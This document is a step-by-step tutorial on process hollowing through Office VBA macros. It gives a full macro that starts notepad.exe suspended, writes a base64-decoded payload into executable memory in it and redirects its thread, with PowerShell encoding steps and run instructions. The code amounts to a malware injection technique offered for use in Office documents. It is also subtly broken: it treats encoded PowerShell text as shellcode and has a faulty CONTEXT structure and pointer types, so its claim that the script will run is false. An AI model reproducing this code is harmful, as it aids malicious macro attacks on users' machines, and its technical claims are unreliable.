# Summary
Injecting code into the memory of a legitimate process using VBA macros can leverage techniques like process hollowing or reflective DLL injection. These methods allow you to execute code within the context of another process without creating a new process or writing the code to disk.

Here's an overview of how you could perform process hollowing using VBA macros to inject your payload into the memory of a legitimate process:

1. **Prepare the Payload:** Encode your payload (e.g., shellcode) that you want to execute within the target process.
2. **Create a Suspended Process:** Use VBA to create a legitimate process in a suspended state, which will act as the host for your payload.
3. **Unmap the Process Memory:** Unmap the memory space of the suspended process, essentially hollowing it out.
4. **Map the Payload:** Allocate memory within the hollowed process and map your payload into this space.
5. **Resume the Process:** Adjust the context of the hollowed process to point to the entry point of your payload and resume its execution.

# Execution
To execute the process hollowing code using VBA macros, follow these steps:

1. **Prepare the VBA Macro:** Write the VBA code to perform the process hollowing.
2. **Replace the Payload:** Ensure that the payload (shellcode) is encoded in base64 format and replace the placeholder in the VBA code with this base64-encoded payload.
3. **Execute the Macro:** Run the VBA macro from within an Office document.

#### Step 1: Prepare the Payload
Assume you have some shellcode (e.g., PowerShell script converted to shellcode):

1. **Encode the Shellcode:** Convert your shellcode to a base64 string.

```
# Example PowerShell script
$script = @"
Add-Type -AssemblyName PresentationFramework
[System.Windows.MessageBox]::Show('Hello, World!')
"@

# Convert to base64
$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
$base64Payload = [System.Convert]::ToBase64String($bytes)
$base64Payload
```

2. **Replace Placeholder in Code:** Replace BASE64_ENCODED_PAYLOAD_HERE in the VBA code with the base64 string obtained from the above step.

#### Step 2: Write the VBA Macro
Using VBA:

1. **Open an Office Document:** Open a Word or Excel document and press `ALT+F11` to open the VBA editor.

2. **Insert a New Module:** Insert a new module and paste the following VBA code into the module.

```
Private Declare PtrSafe Function CreateProcess Lib "kernel32" Alias "CreateProcessA" ( _
    ByVal lpApplicationName As String, _
    ByVal lpCommandLine As String, _
    ByVal lpProcessAttributes As Long, _
    ByVal lpThreadAttributes As Long, _
    ByVal bInheritHandles As Long, _
    ByVal dwCreationFlags As Long, _
    ByVal lpEnvironment As Long, _
    ByVal lpCurrentDirectory As String, _
    ByVal lpStartupInfo As Long, _
    ByVal lpProcessInformation As Long) As Long

Private Declare PtrSafe Function NtUnmapViewOfSection Lib "ntdll.dll" ( _
    ByVal hProcess As LongPtr, _
    ByVal baseAddress As LongPtr) As Long

Private Declare PtrSafe Function VirtualAllocEx Lib "kernel32" ( _
    ByVal hProcess As LongPtr, _
    ByVal lpAddress As LongPtr, _
    ByVal dwSize As Long, _
    ByVal flAllocationType As Long, _
    ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function WriteProcessMemory Lib "kernel32" ( _
    ByVal hProcess As LongPtr, _
    ByVal lpBaseAddress As LongPtr, _
    ByVal lpBuffer As LongPtr, _
    ByVal nSize As Long, _
    ByRef lpNumberOfBytesWritten As Long) As Long

Private Declare PtrSafe Function GetThreadContext Lib "kernel32" ( _
    ByVal hThread As LongPtr, _
    ByRef lpContext As CONTEXT) As Long

Private Declare PtrSafe Function SetThreadContext Lib "kernel32" ( _
    ByVal hThread As LongPtr, _
    ByRef lpContext As CONTEXT) As Long

Private Declare PtrSafe Function ResumeThread Lib "kernel32" ( _
    ByVal hThread As LongPtr) As Long

Private Declare PtrSafe Function CloseHandle Lib "kernel32" ( _
    ByVal hObject As LongPtr) As Long

Private Type STARTUPINFO
    cb As Long
    lpReserved As String
    lpDesktop As String
    lpTitle As String
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As Long
    hStdInput As Long
    hStdOutput As Long
    hStdError As Long
End Type

Private Type PROCESS_INFORMATION
    hProcess As LongPtr
    hThread As LongPtr
    dwProcessId As Long
    dwThreadId As Long
End Type

Private Type CONTEXT
    ContextFlags As Long
    Dr0 As LongPtr
    Dr1 As LongPtr
    Dr2 As LongPtr
    Dr3 As LongPtr
    Dr6 As LongPtr
    Dr7 As LongPtr
    Rax As LongPtr
    Rcx As LongPtr
    Rdx As LongPtr
    Rbx As LongPtr
    Rsp As LongPtr
    Rbp As LongPtr
    Rsi As LongPtr
    Rdi As LongPtr
    R8 As LongPtr
    R9 As LongPtr
    R10 As LongPtr
    R11 As LongPtr
    R12 As LongPtr
    R13 As LongPtr
    R14 As LongPtr
    R15 As LongPtr
    Rip As LongPtr
    SegCs As Long
    SegDs As Long
    SegEs As Long
    SegFs As Long
    SegGs As Long
    SegSs As Long
    EFlags As Long
End Type

Const CREATE_SUSPENDED = &H4
Const CONTEXT_CONTROL = &H10001
Const MEM_COMMIT = &H1000
Const MEM_RESERVE = &H2000
Const PAGE_EXECUTE_READWRITE = &H40

Sub ProcessHollowing()
    Dim payload As String
    payload = "BASE64_ENCODED_PAYLOAD_HERE"
    
    Dim payloadBytes() As Byte
    payloadBytes = Base64Decode(payload)
    
    Dim si As STARTUPINFO
    Dim pi As PROCESS_INFORMATION
    
    si.cb = LenB(si)
    
    ' Create a suspended process (e.g., notepad.exe)
    If CreateProcess(vbNullString, "C:\Windows\System32\notepad.exe", 0, 0, 0, CREATE_SUSPENDED, 0, vbNullString, VarPtr(si), VarPtr(pi)) = 0 Then
        MsgBox "Failed to create process"
        Exit Sub
    End If
    
    ' Unmap the memory of the target process
    NtUnmapViewOfSection pi.hProcess, 0
    
    ' Allocate memory within the target process for the payload
    Dim baseAddress As LongPtr
    baseAddress = VirtualAllocEx(pi.hProcess, 0, UBound(payloadBytes) + 1, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    
    ' Write the payload into the allocated memory space
    Dim bytesWritten As Long
    WriteProcessMemory pi.hProcess, baseAddress, VarPtr(payloadBytes(0)), UBound(payloadBytes) + 1, bytesWritten
    
    ' Update the context of the target process to point to the payload's entry point
    Dim context As CONTEXT
    context.ContextFlags = CONTEXT_CONTROL
    GetThreadContext pi.hThread, context
    context.Rip = baseAddress
    SetThreadContext pi.hThread, context
    
    ' Resume the target process
    ResumeThread pi.hThread
    
    ' Close handles
    CloseHandle pi.hProcess
    CloseHandle pi.hThread
End Sub

Function Base64Decode(base64String As String) As Byte()
    Dim xml As Object
    Set xml = CreateObject("MSXML2.DOMDocument.3.0")
    Dim node As Object
    Set node = xml.createElement("b64")
    node.DataType = "bin.base64"
    node.Text = base64String
    Base64Decode = node.nodeTypedValue
End Function
```

Replace "BASE64_ENCODED_PAYLOAD_HERE" with your base64-encoded payload.

#### Step 3: Execute the Macro
Run the VBA macro from within the Office document by pressing `ALT+F8`, selecting `ProcessHollowing`, and clicking `Run`.

This should execute the payload (in this example, a PowerShell script showing a message box) within the context of the hollowed process (e.g., notepad.exe).

# Example Execution
Below is a simplified walkthrough:

#### Step 1: Prepare the payload in PowerShell

```
$script = @"
Add-Type -AssemblyName PresentationFramework
[System.Windows.MessageBox]::Show('Hello, World!')
"@
$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
$base64Payload = [System.Convert]::ToBase64String($bytes)
$base64Payload
```

#### Step 2: Replace the placeholder in the VBA code

Replace:

```
payload = "BASE64_ENCODED_PAYLOAD_HERE"
```

With:


```
payload = "encoded_payload_from_step_1"
```

#### Step 3: Write the VBA Macro

- Insert a new module in the VBA editor and paste the modified VBA code.
- Replace the placeholder with the base64-encoded payload.

#### Step 4: Run the macro

- Press `ALT+F8`, select `ProcessHollowing`, and click `Run`.

This should execute the payload within the context of the hollowed process. Ensure that you have proper permissions to manipulate the target process and that the payload is appropriate for execution in this manner.